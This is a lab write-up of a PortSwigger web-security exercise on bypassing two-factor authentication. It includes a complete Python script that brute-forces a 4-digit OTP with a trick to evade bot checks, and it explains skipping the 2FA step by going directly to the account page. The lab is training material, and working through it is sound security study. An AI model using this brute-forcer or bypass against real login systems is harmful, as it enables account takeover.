# 2FA simple bypass

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's credentials: `carlos:montoya`

---

## 1. Understanding the 2FA Flow

- Clicked `ACCESS THE LAB` and was presented with a blog page.
- Note: PortSwigger automatically destroys a lab instance if there's no activity on it for a while, which forces you to spin up a new instance. To work around this, kept a background Python script pinging the lab URL at intervals to keep it alive:

```python
import requests
try:
    while True:
        sc = requests.get(url).status_code
        print(sc)
except KeyboardInterrupt:
    print("[+] Exited by user."); import sys; sys.exit(1)
```

- Clicked `My Account` and logged in with `wiener:peter`:

```http
POST /login HTTP/2
Host: 0a24000404631f6e81788eb2002a000e.web-security-academy.net
Cookie: session=wfEEyFUZqsm81gfFApcFBFamavJKVp6s
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a24000404631f6e81788eb2002a000e.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a24000404631f6e81788eb2002a000e.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

username=wiener&password=peter
```

- The server redirected to `/login2`, prompting for a 2FA security code. Went to the email client at `/email`, retrieved the code from the inbox, entered it on `/login2`, and was redirected to `/my-account?id=wiener` — confirming the full 2FA flow.
- The key observation: after passing the first login step (`/login`), the server establishes a partially authenticated session tied to the logged-in user. The 2FA page at `/login2` is the only gate between this partial session and full account access at `/my-account`. The question was: does the server actually enforce that the 2FA step is completed before allowing access to `/my-account`?

---

## 2. Attempted Approach — Brute-forcing the OTP

- Since there was no visible rate-limiting on the 2FA endpoint, the first instinct was to brute-force the 4-digit OTP for `carlos`. Wrote a Python script to automate this: for each candidate code, it logs in fresh as `carlos:montoya` (to get a valid half-authenticated session cookie), then submits that code to `/login2` and checks whether the response is a `302` redirect to `/my-account`:

```python
import requests
import sys

DOMAIN = "https://0a24000404631f6e81788eb2002a000e.web-security-academy.net"
LOGIN_URL = f"{DOMAIN}/login"
_2FA_URL = f"{DOMAIN}/login2"

# surprisingly enough to pass bot protection
# in most servers ;)
GLOBAL_HEADERS = {
    "User-Agent": "Mozilla",
    "Content-Type": "application/x-www-form-urlencoded"
}

def login_get_cookie(username: str, password: str) -> str:
    payload = {
        "username": username,
        "password": password
    }
    # allow_redirects=False is important here — without it, requests follows the
    # 302 automatically and returns the /login2 page's 200, losing the session cookie.
    login_resp = requests.post(url=LOGIN_URL, data=payload, headers=GLOBAL_HEADERS, allow_redirects=False)
    sc = login_resp.status_code
    if sc == 302:
        if login_resp.headers['location'] == "/login2":
            return login_resp.cookies['session']
        else:
            return "[X] '/login2' header is not found."
    else:
        return f"[X] Not 302. Status code: {sc}"

def _2fa_login(mfa_code: str, login_cookie: str) -> bool:
    cookie = {
        "session": login_cookie
    }
    _2fa_payload = {
        "mfa-code": mfa_code
    }
    _2fa_login_resp = requests.post(url=_2FA_URL, data=_2fa_payload, headers=GLOBAL_HEADERS, cookies=cookie)
    if _2fa_login_resp.status_code == 302 and "Incorrect security code" not in _2fa_login_resp.text:
        if "/my-account?id=" in _2fa_login_resp.headers['location']:
            return True
        else:
            return False
    else:
        return False

print("[*] Starting brute-force loop...")

try:
    for i in range(999, 9999):
        mfa_code = i

        login_cookie = login_get_cookie("carlos", "montoya")

        if login_cookie and not login_cookie.startswith("[X]"):
            print(f"[*] Testing Code: {mfa_code} | Session: {login_cookie[:12]}...")

            if _2fa_login(mfa_code, login_cookie):
                print(f"\n[SUCCESS] Valid 2FA Code Found: {mfa_code}")
                break
        else:
            print(f"[-] Login failed for code {mfa_code}: {login_cookie}")

except KeyboardInterrupt:
    print(f"\n[EXIT] Program terminated by user.")
    sys.exit(0)
```

- The script worked and would eventually find the code, but after letting it run for a while the question arose — is brute-forcing a 4-digit OTP really the intended approach for the *second* lab in the series? That felt excessive.

---

## 3. The Actual Bypass — Direct URL Navigation

- Checked the official solution hint, which revealed the real vulnerability:

> 1. Log in to your own account. Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails.
> 2. Go to your account page and make a note of the URL.
> 3. Log out of your account.
> 4. Log in using the victim's credentials.
> 5. When prompted for the verification code, manually change the URL to navigate to `/my-account`. The lab is solved when the page loads.

- The server never actually enforces that the 2FA step is completed before granting access to `/my-account`. Once the first login step is passed (correct username + password), the session cookie is already tied to that user. Navigating directly to `/my-account` skips the 2FA page entirely — the server doesn't check whether `login2` was ever visited or completed.

> **Why this works:** The application treats the two-step login as a UI flow rather than a server-enforced state machine. Completing step 1 (`/login`) is enough to create a session associated with `carlos` — the 2FA check at `/login2` only blocks access if the user follows the redirect. Since no server-side state tracks whether 2FA was actually verified before `/my-account` is accessed, bypassing the 2FA page is as simple as changing the URL in the browser's address bar.

- Logged in as `carlos:montoya`, was redirected to `/login2`, then manually navigated to `/my-account` instead of entering a code. The account page loaded successfully.
- Lab solved.